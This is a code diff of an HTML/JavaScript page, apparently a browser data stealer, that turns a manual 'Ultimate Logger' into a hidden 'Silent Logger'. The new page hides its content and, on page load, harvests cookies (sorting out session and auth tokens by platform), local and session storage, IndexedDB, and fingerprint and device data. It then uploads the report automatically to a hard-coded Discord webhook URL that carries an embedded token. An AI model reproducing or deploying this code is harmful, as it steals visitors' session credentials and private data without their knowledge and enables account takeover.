@@ -2,56 +2,73 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Ultimate Logger - TXT Export & Cookie Categorization</title>
+    <title>Silent Logger</title>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
-        pre { background: #111; padding: 15px; overflow-x: auto; border-left: 3px solid #0f0; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
-        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-right: 10px; }
-        .download-btn { background: #00f; color: #fff; }
-        h1, h2 { color: #0f0; }
+        body {
+            background: #fff;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, sans-serif;
+            visibility: hidden; /* Hides everything initially */
+        }
+        #download-area {
+            visibility: visible;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #f0f0f0;
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-family: monospace;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 9999;
+        }
+        #download-link {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        #status {
+            visibility: visible;
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 11px;
+            z-index: 9999;
+        }
     </style>
 </head>
 <body>
-    <h1>📡 ULTIMATE LOGGER + COOKIE CATEGORIZATION</h1>
-    <p>Collects everything, guesses cookie platforms, exports to .txt file.</p>
-    <button id="downloadBtn" class="download-btn">📥 Download .txt Report</button>
-    <button id="webhookBtn" style="background:#f00;">🚀 Send to Discord Webhook</button>
-    <h2>📄 Live Preview (First 2000 chars)</h2>
-    <pre id="output">Initializing...</pre>
+    <div id="status">⚙️ Initializing...</div>
+    <div id="download-area" style="display:none;">
+        📥 <a href="#" id="download-link">Save full report (.txt)</a>
+    </div>
 
     <script>
         // ========== CONFIGURATION ==========
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-        // ========== COOKIE CATEGORIZATION (by name patterns) ==========
+        // ========== COOKIE CATEGORIZATION ==========
         function categorizeCookie(name, value) {
             const lowerName = name.toLowerCase();
             const lowerValue = value.toLowerCase();
-            
-            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook"))
-                return "Facebook / Meta";
-            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerName.includes("youtube") || lowerValue.includes("google"))
-                return "Google / YouTube";
-            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter"))
-                return "Twitter (X)";
-            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon"))
-                return "Amazon";
-            if (lowerName.includes("reddit") || lowerValue.includes("reddit"))
-                return "Reddit";
-            if (lowerName.includes("instagram") || lowerValue.includes("instagram"))
-                return "Instagram";
-            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin"))
-                return "LinkedIn";
-            if (lowerName.includes("discord") || lowerValue.includes("discord"))
-                return "Discord";
-            if (lowerName.includes("github") || lowerValue.includes("github"))
-                return "GitHub";
-            if (lowerName.includes("cloudflare") || lowerName.includes("__cf"))
-                return "Cloudflare";
-            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt"))
-                return "Session / Auth (generic)";
-            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel"))
-                return "Advertising / Tracker";
+            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook")) return "Facebook / Meta";
+            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerValue.includes("google")) return "Google / YouTube";
+            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter")) return "Twitter (X)";
+            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon")) return "Amazon";
+            if (lowerName.includes("reddit") || lowerValue.includes("reddit")) return "Reddit";
+            if (lowerName.includes("instagram") || lowerValue.includes("instagram")) return "Instagram";
+            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin")) return "LinkedIn";
+            if (lowerName.includes("discord") || lowerValue.includes("discord")) return "Discord";
+            if (lowerName.includes("github") || lowerValue.includes("github")) return "GitHub";
+            if (lowerName.includes("cloudflare") || lowerName.includes("__cf")) return "Cloudflare";
+            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt")) return "Session / Auth (generic)";
+            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel")) return "Advertising / Tracker";
             return "Unknown / Other";
         }
 
@@ -168,7 +185,6 @@
             const indexedDB = await getAllIndexedDB();
             const fingerprint = await generateFingerprint();
             
-            // Group cookies by platform
             const platformGroups = {};
             for (const cookie of cookies) {
                 if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
@@ -211,7 +227,7 @@
             };
         }
 
-        // ========== GENERATE .TXT REPORT ==========
+        // ========== GENERATE TXT REPORT ==========
         async function generateTextReport(data) {
             let report = "=".repeat(80) + "\n";
             report += "          ULTIMATE PRIVATE LOGGER REPORT\n";
@@ -221,10 +237,9 @@
             report += `Referrer: ${data.referrer || "(none)"}\n`;
             report += `Timezone: ${data.timezone}\n\n`;
             
-            // COOKIES with platform categorization
-            report += "-" .repeat(80) + "\n";
+            report += "-".repeat(80) + "\n";
             report += "🍪 COOKIES (by platform)\n";
-            report += "-" .repeat(80) + "\n";
+            report += "-".repeat(80) + "\n";
             for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
                 report += `\n[${platform}] (${cookies.length} cookies)\n`;
                 for (const cookie of cookies) {
@@ -233,7 +248,6 @@
             }
             if (data.cookies.length === 0) report += "\nNo cookies found.\n";
             
-            // LocalStorage
             report += "\n" + "-".repeat(80) + "\n";
             report += "💾 LOCALSTORAGE\n";
             report += "-".repeat(80) + "\n";
@@ -242,7 +256,6 @@
                 report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
             }
             
-            // SessionStorage
             report += "\n" + "-".repeat(80) + "\n";
             report += "📦 SESSIONSTORAGE\n";
             report += "-".repeat(80) + "\n";
@@ -251,7 +264,6 @@
                 report += `${key} = ${valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr}\n`;
             }
             
-            // IndexedDB
             report += "\n" + "-".repeat(80) + "\n";
             report += "🗃️ INDEXEDDB DATABASES\n";
             report += "-".repeat(80) + "\n";
@@ -263,7 +275,6 @@
                 report += JSON.stringify(data.indexedDB, null, 2);
             }
             
-            // System & Browser
             report += "\n" + "-".repeat(80) + "\n";
             report += "🖥️ SYSTEM & BROWSER INFO\n";
             report += "-".repeat(80) + "\n";
@@ -275,95 +286,80 @@
             report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
             report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
             report += `Online: ${data.navigator.onLine}\n`;
-            
-            // Screen
             report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
             report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
             report += `Orientation: ${data.screen.orientation}\n`;
-            
-            // GPU
             report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
             report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
-            
-            // Battery & Connection
             report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
             report += `Connection: ${JSON.stringify(data.connection)}\n`;
-            
-            // Plugins
             report += `\nPlugins: ${data.plugins.join(", ") || "none"}\n`;
-            
-            // Fingerprint
             report += `\n🔐 Fingerprint (SHA-256): ${data.fingerprint}\n`;
-            
             report += "\n" + "=".repeat(80) + "\n";
             report += "END OF REPORT\n";
             report += "=".repeat(80);
-            
             return report;
         }
 
-        // ========== SEND TO WEBHOOK ==========
-        async function sendToWebhook(data) {
-            // Create a shorter summary for Discord embed due to 2000 char limit
-            const cookieSummary = data.cookies.slice(0, 15).map(c => `${c.name} (${c.platform})`).join(", ");
-            const payload = {
-                username: "🔥 TXT Logger",
-                avatar_url: "https://i.imgur.com/2xVfCiq.png",
+        // ========== SEND AS FILE ATTACHMENT TO DISCORD ==========
+        async function sendToWebhookAsFile(reportText, data) {
+            const blob = new Blob([reportText], { type: "text/plain" });
+            const formData = new FormData();
+            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
+            formData.append("file", blob, filename);
+            
+            // Optional: add a small embed with summary
+            const summary = {
+                content: null,
                 embeds: [{
-                    title: "📦 Log Report Ready",
-                    description: `**URL:** ${data.url}\n**Cookies:** ${data.cookies.length} total\n**Platforms:** ${Object.keys(data.cookiesGrouped).join(", ")}`,
-                    color: 0xff0000,
-                    fields: [
-                        { name: "🍪 Sample Cookies", value: cookieSummary.slice(0, 1000) || "(none)", inline: false },
-                        { name: "🆔 Fingerprint", value: `\`${data.fingerprint}\``, inline: false },
-                        { name: "📥 Download", value: "Click the 'Download .txt Report' button on the page.", inline: false }
-                    ],
-                    footer: { text: "Full report exported to .txt" },
+                    title: "📥 Silent Logger Report",
+                    description: `**URL:** ${data.url}\n**Cookies:** ${data.cookies.length} total\n**Platforms:** ${Object.keys(data.cookiesGrouped).join(", ")}\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
+                    color: 0x00ff00,
+                    footer: { text: "Full report attached as .txt" },
                     timestamp: data.timestamp
                 }]
             };
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+            formData.append("payload_json", JSON.stringify(summary));
+            
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    body: formData
+                });
+                if (response.ok) {
+                    document.getElementById("status").innerHTML = "✅ Data sent to webhook (with .txt file)";
+                } else {
+                    document.getElementById("status").innerHTML = "⚠️ Webhook error: " + response.status;
+                }
+            } catch(e) {
+                document.getElementById("status").innerHTML = "❌ Webhook send failed: " + e.message;
+            }
         }
 
-        // ========== MAIN ==========
-        let globalData = null;
-        const outputPre = document.getElementById("output");
-        
+        // ========== MAIN EXECUTION (AUTOMATIC) ==========
         (async function() {
-            outputPre.innerText = "Collecting all data...";
-            globalData = await collectAllData();
-            outputPre.innerText = "✅ Data ready!\n\n" + JSON.stringify(globalData, null, 2).slice(0, 2000) + "...\n\nClick 'Download .txt Report' for full categorized export.";
+            const statusDiv = document.getElementById("status");
+            try {
+                statusDiv.innerHTML = "🔍 Collecting data...";
+                const allData = await collectAllData();
+                statusDiv.innerHTML = "📝 Generating report...";
+                const reportText = await generateTextReport(allData);
+                statusDiv.innerHTML = "📤 Sending to webhook...";
+                await sendToWebhookAsFile(reportText, allData);
+                
+                // Prepare download link
+                const blob = new Blob([reportText], { type: "text/plain" });
+                const url = URL.createObjectURL(blob);
+                const downloadLink = document.getElementById("download-link");
+                downloadLink.href = url;
+                downloadLink.download = `logger_${allData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
+                document.getElementById("download-area").style.display = "block";
+                statusDiv.innerHTML = "✅ Done! Click the link to save local copy.";
+            } catch(err) {
+                statusDiv.innerHTML = "💥 Error: " + err.message;
+                console.error(err);
+            }
         })();
-        
-        document.getElementById("downloadBtn").onclick = async () => {
-            if (!globalData) {
-                alert("Data not ready yet, wait a second.");
-                return;
-            }
-            const reportText = await generateTextReport(globalData);
-            const blob = new Blob([reportText], { type: "text/plain" });
-            const link = document.createElement("a");
-            const url = URL.createObjectURL(blob);
-            link.href = url;
-            link.download = `logger_report_${new Date().toISOString().slice(0,19)}.txt`;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            URL.revokeObjectURL(url);
-        };
-        
-        document.getElementById("webhookBtn").onclick = async () => {
-            if (!globalData) {
-                alert("Data not ready yet.");
-                return;
-            }
-            await sendToWebhook(globalData);
-            alert("Sent to Discord webhook!");
-        };
     </script>
 </body>
 </html>
